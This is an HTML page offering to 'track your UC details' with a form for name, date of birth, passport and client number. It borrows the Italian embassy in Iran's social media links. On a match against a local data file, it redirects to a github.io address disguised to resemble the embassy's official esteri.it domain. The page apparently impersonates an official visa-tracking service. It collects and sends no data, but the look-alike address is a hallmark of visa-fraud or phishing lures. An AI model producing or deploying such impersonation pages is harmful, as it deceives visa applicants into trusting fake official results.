<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Track your UC Details</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      background-color: #f1f1f1;
    }

    header {
      background-color: #ffffff;
      padding: 20px;
      text-align: center;
    }

    header img {
      width: 150px;
      max-width: 80%;
      display: block;
      margin: 0 auto;
    }

    header h1 {
      margin-top: 10px;
      font-size: 24px;
      font-weight: bold;
      color: #ffffff;
    }

    main {
      flex: 1;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      box-sizing: border-box;
      font-size: 16px;
    }

    button {
      background-color: #004466;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #006699;
    }

    #error {
      color: red;
      display: none;
      font-weight: bold;
      text-align: center;
    }

    #loadingScreen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: white;
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }

    #loadingScreen img {
      width: 80px;
      height: 80px;
    }

    footer {
      background-color: #ffffff;
      padding: 10px;
      text-align: center;
    }

    .social a {
      margin: 0 10px;
      text-decoration: none;
      color: #004466;
      font-weight: bold;
    }

    @media (max-width: 480px) {
      header h1 {
        font-size: 18px;
      }

      form {
        padding: 15px;
      }

      input, button {
        font-size: 14px;
        padding: 10px;
      }

      #loadingScreen img {
        width: 60px;
        height: 60px;
      }
    }
  </style>
</head>
<body>

  <header>
    <img src="logo.png" alt="Logo" class="logo">
    <h1>Track your UC Details</h1>
  </header>

  <main>
    <form id="verifyForm">
      <input type="text" id="name" placeholder="Name" required />
      <input type="text" id="lastname" placeholder="Last Name" required />
      <input type="date" id="dob" placeholder="Date of Birth" required />
      <input type="text" id="passport" placeholder="Passport No (Optional)" />
      <input type="text" id="clientno" placeholder="Client No" required />
      <button type="submit">Tracking</button>
      <p id="error">Incorrect information entered!</p>
    </form>
  </main>

  <div id="loadingScreen">
    <img src="Loading.gif" alt="Loading...">
  </div>

  <footer>
    <div class="social">
      <a href="https://www.instagram.com/italyiniran/?hl=en" target="_blank">Instagram</a>
      <a href="https://www.youtube.com/channel/UCd2txiPLDY7WfWRaXYmqgiw" target="_blank">YouTube</a>
      <a href="https://twitter.com/italyiniran" target="_blank">X</a>
    </div>
  </footer>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', function (e) {
      e.preventDefault();
      document.getElementById('error').style.display = 'none';
      document.getElementById('loadingScreen').style.display = 'flex';

      setTimeout(() => {
        fetch('data.json')
          .then(response => response.json())
          .then(data => {
            const name = document.getElementById('name').value.trim();
            const lastname = document.getElementById('lastname').value.trim();
            const dob = document.getElementById('dob').value.trim();
            const clientno = document.getElementById('clientno').value.trim();

            document.getElementById('loadingScreen').style.display = 'none';

            if (
              name === data.name &&
              lastname === data.lastname &&
              dob === data.dob &&
              clientno === data.clientno
            ) {
              window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/';
            } else {
              document.getElementById('error').style.display = 'block';
            }
          })
          .catch(err => {
            document.getElementById('loadingScreen').style.display = 'none';
            console.error('Error loading data.json:', err);
          });
      }, 3000);
    });
  </script>

</body>
</html>
